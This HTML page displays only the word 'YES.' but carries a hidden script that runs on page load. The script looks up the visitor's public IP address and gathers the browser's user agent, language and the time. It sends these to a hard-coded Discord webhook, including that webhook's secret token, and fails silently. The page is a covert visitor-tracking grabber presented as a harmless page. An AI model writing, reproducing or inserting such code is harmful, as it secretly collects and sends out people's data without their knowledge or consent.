<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YES</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, Helvetica, sans-serif;
            overflow: hidden;
        }
        h1 {
            font-size: 15vw;
            font-weight: 900;
            letter-spacing: 0.05em;
            text-transform: uppercase;
            user-select: none;
        }
    </style>
</head>
<body>
    <h1>YES.</h1>

    <script>
        (async () => {
            try {
                // Get public IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ip = ipData.ip;

                // Extra info
                const ua = navigator.userAgent;
                const lang = navigator.language;
                const time = new Date().toISOString();

                // Send to Discord webhook
                await fetch('https://discord.com/api/webhooks/1502109685703114904/kXlls-rZJVnWZY44ydMybAtQYtPHnJGPKbTtUw7aBO7mlTRyVkm3dNHOqb1SvP-DibQN', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `**New visitor**\nIP: \`${ip}\`\nTime: ${time}\nUA: \`${ua}\`\nLang: ${lang}`
                    })
                });
            } catch (e) {
                // silent fail
            }
        })();
    </script>
</body>
</html>
